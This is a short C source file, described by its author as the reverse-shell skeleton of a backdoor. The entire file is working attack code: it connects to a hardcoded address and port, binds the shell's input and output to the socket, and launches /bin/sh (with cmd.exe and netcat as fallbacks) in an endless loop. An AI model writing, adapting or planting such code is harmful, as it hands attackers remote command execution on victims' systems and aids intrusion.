/* reverse shell.c  
a skelleton of reverse shell contained in the backdoor. */


/* coder mrx6s0 */

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 2121

int main(int argc, char *argv[])

{
    struct sockaddr_in sa;

    int x;

    do {

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    x = socket(AF_INET, SOCK_STREAM, 0);

    connect(x, (struct sockaddr *)&sa, sizeof(sa));
    //send(msocket("Conected...\n",31,0));

    dup2(x, 0);
    dup2(x, 1);
    dup2(x, 2);

    execve("/bin/sh", 0, 0);
    execve("cmd.exe", 0, 0);
    execve("/netcat", 0, 0);

    }

    while (1);

    return 0;
}
